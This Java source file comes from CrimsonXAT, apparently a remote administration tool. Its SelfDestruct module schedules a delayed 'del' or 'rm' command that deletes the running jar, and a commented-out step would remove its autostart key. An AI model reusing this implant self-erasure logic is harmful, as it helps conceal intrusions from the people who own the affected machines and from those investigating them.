/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.permajar.stage2.modules;



import java.util.ArrayList;

import subterranean.crimson.universal.DelayedScript;
import subterranean.crimson.universal.Platform;

public class SelfDestruct {

	public static void run() {

		ArrayList<String> script = new ArrayList<String>();
		if (Platform.windows) {

			// if (PermaJar.options.packed_feature_autostart) {
			// // remove startup key
			// Autostart.uninstall();
			// }

			script.add("del " + Platform.currentJar.getAbsolutePath());

		} else {

			script.add("rm " + Platform.currentJar.getAbsolutePath());

		}

		DelayedScript.run(script);

	}

}
